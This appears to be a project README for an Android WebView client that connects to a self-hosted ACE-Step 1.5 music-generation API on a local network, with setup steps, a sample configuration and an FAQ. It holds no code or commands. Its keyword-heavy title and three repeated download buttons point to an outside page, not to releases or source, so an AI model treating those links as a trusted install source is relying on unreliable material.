# Seance ACE-Step Android Client v1.5 - Android WebView Client 2026

> **A WebView-based Android client for ACE-Step 1.5. It connects to a self-hosted API on your local network, uses a native HTTP bridge for requests, and delivers the interface as a modern Android build.**

[![Platform](https://img.shields.io/badge/Platform-Android-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.5-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/willedacooper8287/seance-ace-step-android-app?style=flat-square)](https://github.com/willedacooper8287/seance-ace-step-android-app)

---

<p align="center">
  <a href="https://willedacooper8287.github.io/seance-ace-step-android-app/">
    <img src="https://img.shields.io/badge/Download-Seance%20ACE--Step%20Android%20Client%20Latest-brightgreen?style=for-the-badge" alt="Download Seance ACE-Step Android Client">
  </a>
</p>

> **[Download Seance ACE-Step Android Client v1.5](https://willedacooper8287.github.io/seance-ace-step-android-app/)**

---

[Download Latest Build](https://willedacooper8287.github.io/seance-ace-step-android-app/)

---

## Overview

Seance ACE-Step Android Client packages the ACE-Step 1.5 web interface inside an Android WebView for AI music generation. It acts as a mobile client for a self-hosted ACE-Step API running on a LAN, allowing the interface to be opened and used from an Android device.

Rather than replacing the web application with a fully native implementation, this project provides a small Android integration layer. WebView rendering, bundled asset delivery, and Android bridge functionality work together to expose the web interface while delegating selected operations to native code.

---

## What It Provides

- WebView-based Android interface for ACE-Step 1.5
- Native HTTP request bridge for communicating with a LAN API
- Compatibility with self-hosted ACE-Step server deployments
- Bundled resource delivery through WebViewAssetLoader
- File-saving capabilities through AndroidBridge
- GitHub Actions automation for producing APK builds
- Mobile-focused access to AI music generation workflows
- Small, focused Android client architecture

---

## Getting Started

1. Clone the repository or download its source.
2. Import the project into your Android build environment.
3. Compile the APK locally, or use an available automated build artifact.
4. Install the resulting APK on an Android device.

When running a source build, open the application entry point and verify that the Android device can reach the configured API endpoint over the local network.

---

## Using the Client

To use the application:

1. Run an ACE-Step API server somewhere on the local network.
2. Start the Android client.
3. Point the client at the server address configured for your LAN.
4. Use the embedded WebView to access the ACE-Step music generation interface.
5. When export or download actions are available, use the Android bridge to save the resulting files.

A normal session looks like this:

- Run ACE-Step on a computer accessible to the Android device.
- Launch the client APK.
- Open the web interface and submit generation requests.
- Collect or save generated results through the native file-saving path.

---

## Connection and Bridge Configuration

The main configuration concerns the LAN API endpoint and the native services exposed to the WebView.

Relevant values may include:

- The API server URL
- LAN endpoint information
- The asset-serving mode provided by WebViewAssetLoader
- File output behavior supplied by AndroidBridge

Example configuration:

    {
      "apiBaseUrl": "http://192.168.1.100:PORT",
      "assetMode": "WebViewAssetLoader",
      "fileSaveMode": "AndroidBridge"
    }

Replace the example connection details with values appropriate for the host running ACE-Step and the network used by the Android device.

---

## Requirements

- Android device or emulator
- Android WebView functionality
- A self-hosted ACE-Step 1.5 API server available over the LAN
- Network access between the Android client and that server
- An Android build environment when compiling the project yourself
- Enough storage for the APK and saved generated files

---

## Frequently Asked Questions

**How can I update the client?**  
Download the newest release or automated build artifact from the project download location.

**What is handled by the native HTTP bridge?**  
The bridge performs Android-side request handling for the LAN API calls initiated by the WebView client.

**How does the application serve its bundled assets?**  
Bundled interface content is exposed inside the app through WebViewAssetLoader.

**Is the ACE-Step server address configurable?**  
Yes. Change the LAN API endpoint so it points to the ACE-Step host used in your setup.

**Why can the application not reach my server?**  
Make sure the ACE-Step server is running, the Android device is connected to the same network, the configured address is accurate, and the endpoint can be reached from Android.

---

## License

This project is distributed under the GNU GPL v3.0. See [LICENSE](LICENSE) for the full license text.
